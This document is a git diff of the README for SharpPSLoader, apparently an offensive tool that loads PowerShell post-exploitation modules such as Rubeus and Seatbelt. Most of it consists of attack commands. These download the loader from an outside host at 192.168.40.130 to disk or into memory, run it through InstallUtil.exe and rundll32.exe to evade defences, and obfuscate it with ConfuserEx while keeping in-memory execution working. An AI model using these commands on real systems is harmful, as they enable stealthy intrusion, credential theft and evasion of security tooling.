@@ -14,12 +14,17 @@ For detailed usage, refer to the `Usage` section below.
 ## Credits 
 All credits goes to [@S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t), [@Jean_Maes_1994](https://twitter.com/Jean_Maes_1994), [@xpn](https://twitter.com/_xpn_), [@3xpl01tc0d3r](https://3xpl01tc0d3r.blogspot.com/), OSEP, and other researchers in the field. I just copy/pasted their code & added couple lines of code and that's all.
 
+## Demo 
+SharpPSLoader can be executed on-disk, in-memory, through InstallUtils.exe, and through rundll32.exe. 
+
+![demo](/images/Sharppsloader-demo.gif)
+
 ## Usage 
 
 SharpPSLoaderConsole and SharpPSLoaderLibrary can be executed with the following syntax: 
 ```
 ./SharpPSLoaderConsole <payload#> <powershell_function & arguments>
-ex) SharpPSLoaderConsole 1 PowersharpPack -rubeus -command "triage"
+ex) ./SharpPSLoaderConsole 1 powersharppack -rubeus -command "triage"
 ```
 
 Current list of payloads:
@@ -30,7 +35,7 @@ Current list of payloads:
 
 ### SharpPSLoaderConsole - on-disk console 
 ```
-(new-object net.webclient).downloadfile("http://192.168.40.130:8888/SharpPSLoaderConsole.exe","c:\users\low\desktop\SharpPSLoaderConsole.exe")
+(new-object net.webclient).downloadfile("http://192.168.40.130:8888/SharpPSLoaderConsole.exe","c:\users\low\SharpPSLoaderConsole.exe")
 .\SharpPSLoaderConsole.exe 1 powersharppack -seatbelt -command "-group=user"
 ```
 ### SharpPSLoaderConsole - in-memory 
@@ -44,9 +49,9 @@ $b = (New-Object net.webclient).DownloadData("http://192.168.40.130:8888/SharpPS
 
 ### SharpPSLoaderConsole - LOLBAS - InstallUtils.exe, on-disk
 ```
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="<payload#> <powershell_function & argument>" /U .\SharpPSLoaderLibrary.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="<payload#> <powershell_function & argument>" /U .\SharpPSLoaderConsole.exe
 
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoaderLibrary.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoaderConsole.exe
 ```
 
 ### SharpPSLoaderLibrary - LOLBAS - rundll32.exe, on-disk 
@@ -60,7 +65,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToCo
 For detailed usage of PowerSharpPack and Invoke-Bloodhound, refer to the `References` section down below.
 
 ## Obfuscation - Warning 
-If you want to obfuscate the assembly with confuserEx and execute it in-memory, use the  `SharpPSLoader-confuser.crproj` configuration file as a template. The configuration file's rules were specifically built to not scramble assembly types so it can be executed in-memory. If you know what you are doing, you do you.  
+If you want to obfuscate the assembly with confuserEx and execute it in-memory, use the  `SharpPSLoader-confuser.crproj` configuration file as a template. The configuration file's rules were specifically built to not scramble assembly types and not include compressor so the assembly can be executed in-memory. If you know what you are doing, you do you.  
 
 ```
 <project outputDir="<output-directory>" baseDir="<base-directory>" xmlns="http://confuser.codeplex.com">
